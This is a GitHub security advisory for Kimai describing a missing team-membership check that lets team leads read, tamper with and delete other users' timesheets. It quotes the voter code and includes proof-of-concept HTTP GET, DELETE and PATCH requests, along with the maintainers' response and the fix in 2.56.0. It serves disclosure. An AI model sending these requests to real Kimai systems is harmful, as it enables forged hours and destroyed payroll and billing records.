# [M] Kimai has Missing Voter Check that Allows Cross-Team Timesheet Manipulation

## Summary
Severity: Medium
Advisory: GHSA-9g2q-w3w2-vf7q
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-9g2q-w3w2-vf7q
Type: github-advisory

## Affected
- Packagist: `kimai/kimai` — affected >=0 <2.56.0

## Details
### Summary

Any ROLE_TEAMLEAD user can enumerate, read, modify, and permanently delete timesheets belonging to any other user in the system — regardless of team membership. This enables data destruction (deleted billable hours), data tampering (forged timesheet durations), and full authorization bypass on timesheet resources. Verified against Kimai 2.52.0.

### Details

`TimesheetVoter::voteOnAttribute()` maps permissions to `own_timesheet` or `other_timesheet` without checking team membership. The voter's own comment confirms this is a known gap:

```php
// extend me for "team" support later on
if ($subject->getUser()?->getId() === $user->getId()) {
    $permission .= 'own';
} else {
    $permission .= 'other';
}
```

### PoC

Tested against Kimai 2.52.0 Docker instance.

Setup:
- User A (usera, ROLE_TEAMLEAD) owns timesheet ID 2 with description "Private timesheet - UserA only"
- User B (userb, ROLE_TEAMLEAD) is NOT on any team with User A

**User B reads User A's timesheet data:**

```
GET /api/timesheets/2 HTTP/1.1
X-AUTH-USER: userb
X-AUTH-TOKEN: <userb_api_token>
```

Response: HTTP 200 — returns full timesheet record including description "Private timesheet - UserA only".

**User B deletes User A's timesheet:**

```
DELETE /api/timesheets/3 HTTP/1.1
X-AUTH-USER: userb
X-AUTH-TOKEN: <userb_api_token>
```

Response: HTTP 204 No Content — timesheet permanently deleted.

**User B tampers User A's timesheet:**

```
PATCH /api/timesheets/6 HTTP/1.1
X-AUTH-USER: userb
X-AUTH-TOKEN: <userb_api_token>
Content-Type: application/json

{"begin":"2026-03-24T08:00:00","end":"2026-03-24T18:00:00","project":1,"activity":1,"description":"TAMPERED","exported":false,"billable":false}
```

Response: HTTP 200 OK — duration inflated from 3600s to 36000s, description overwritten.

**Note:** ROLE_USER (userc) is correctly blocked — DELETE returns 403 and the actions endpoint returns an empty array. The vulnerability only affects ROLE_TEAMLEAD and above. Timesheet IDs are sequential integers, trivially enumerable.

### Impact

Any authenticated user with ROLE_TEAMLEAD or above can:

1. Permanently delete timesheets belonging to any user system-wide — destroying billable hours, payroll data, and project billing history
2. Silently alter timesheet descriptions, hours, and billing flags — forging hours up or down, directly affecting invoicing and payroll
3. Enumerate all timesheet IDs (sequential integers) and access action metadata for arbitrary records

No user interaction required. ROLE_USER accounts are correctly restricted; the vulnerability is specific to ROLE_TEAMLEAD receiving global scope instead of team-scoped access.

### Maintainers answer: why this is not eligible for a CVE

The behavior described matches the documented permission model. Per the Kimai documentation, the relevant permissions granted to `ROLE_TEAMLEAD` are:

- `edit_other_timesheet` — Edit existing records of other users
- `delete_other_timesheet` — Delete existing records of other users

These permissions were global by design, not team-scoped. The UI surfaces only the teamlead's own team timesheets, but the API has historically honored these permissions as documented: a role holding `*_other_timesheet` can act on any other user's timesheet. The inline comment `// extend me for "team" support later on` reflects this accurately — team-scoped enforcement was a planned enhancement, not a security control that existed and failed.

The report frames this as authorization bypass, but no authorization boundary is being crossed: `ROLE_TEAMLEAD` is operating within its documented permissions.

Kimai acknowledges that this behavior might not be expected, so while it will be treated as a feature request for team-scoped permission enforcement and not a vulnerability, it still track it as having security implications.

### Solution

Team-scoped timesheet permission checks were added in 2.56.0.

Operators of Kimai <= 2.55 who need stricter isolation between teamleads should not grant `ROLE_TEAMLEAD` to users who must not act on other teams' timesheets.

## References
- https://github.com/kimai/kimai/security/advisories/GHSA-9g2q-w3w2-vf7q
- https://github.com/kimai/kimai
